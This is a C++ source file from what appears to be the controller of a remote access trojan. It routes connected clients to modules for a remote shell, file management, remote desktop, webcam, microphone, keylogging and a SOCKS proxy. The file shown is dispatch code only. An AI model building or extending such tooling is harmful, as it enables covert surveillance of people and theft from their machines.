#include "stdafx.h"
#include "Manager.h"
#include "IOCPServer.h"
#include "Packet.h"
#include "MsgHandler.h"
#include "ClientContext.h"
#include "KernelSrv.h"
#include "MiniFileTransSrv.h"
#include "MiniDownloadSrv.h"
#include "CmdSrv.h"
#include "ChatSrv.h"
#include "FileManagerSrv.h"
#include "FileMgrSearchSrv.h"
#include "RemoteDesktopSrv.h"
#include "CameraSrv.h"
#include "AudioSrv.h"
#include "MainFrm.h"
#include "KeybdLogSrv.h"
#include "SocksProxySrv.h"
#include "zlib\zlib.h"
#include "InvalidHandler.h"
#include "utils.h"


#ifdef DEBUG
#pragma comment(lib,"zlibd.lib")
#else
#pragma comment(lib,"zlib.lib")
#endif

CManager::CManager(HWND hNotifyWnd):
	m_hNotifyWnd(hNotifyWnd)
{
}

CManager::~CManager()
{
}

//HandlerInit And HandlerTerm must be called in UI Thread.
//
BOOL CManager::handler_init(CClientContext*pClientContext, DWORD Identity)
{
	if (!pClientContext)
		return FALSE;

	CMsgHandler*pHandler = NULL;
	/**************************Create Handler*********************************/
	switch (Identity)
	{
	case KNEL:
		pHandler = new CKernelSrv(((CMainFrame*)AfxGetApp()->m_pMainWnd)->
			m_ClientList.GetSafeHwnd(), pClientContext);
		break;
	case MINIFILETRANS:
		pHandler = new CMiniFileTransSrv(pClientContext);
		break;
	case MINIDOWNLOAD:
		pHandler = new CMiniDownloadSrv(pClientContext);
		break;
	case CMD:
		pHandler = new CCmdSrv(pClientContext);
		break;
	case CHAT:
		pHandler = new CChatSrv(pClientContext);
		break;
	case FILE_MANAGER:
		pHandler = new CFileManagerSrv(pClientContext);
		break;
	case FILEMGR_SEARCH:
		pHandler = new CFileMgrSearchSrv(pClientContext);
		break;
	case REMOTEDESKTOP:
		pHandler = new CRemoteDesktopSrv(pClientContext);
		break;
	case CAMERA:
		pHandler = new CCameraSrv(pClientContext);
		break;
	case AUDIO:
		pHandler = new CAudioSrv(pClientContext);
		break;
	case KBLG:
		pHandler = new CKeybdLogSrv(pClientContext);
		break;
	case SOCKS_PROXY:
		pHandler = new CSocksProxySrv(pClientContext);
		break;
	default:
		dbg_log("Invalid handler [%x] : ", Identity);
		pHandler = new CInvalidHandler(pClientContext);
		break;
	}
	ASSERT(pHandler);	
	pClientContext->SetCallbackHandler(pHandler);
	pHandler->OnConncet();
	return TRUE;
}

BOOL CManager::handler_term(CClientContext*pClientContext, DWORD Identity){
	if (!pClientContext)
		return FALSE;

	CMsgHandler * pHandler = pClientContext->GetCallbackHandler();
	pHandler->OnDisconnect();
	delete pHandler;
	return TRUE;
}

void CManager::OnClientConnect(CClientContext*pClientCtx){
	SendMessage(m_hNotifyWnd, WM_SOCKET_CONNECT, (WPARAM)pClientCtx,
		pClientCtx->GetIdentity());
}

void CManager::OnClientDisconnect(CClientContext*pClientCtx){
	SendMessage(m_hNotifyWnd, WM_SOCKET_CLOSE, (WPARAM)pClientCtx,
		pClientCtx->GetIdentity());
}

void CManager::OnAcceptAboart(){

}
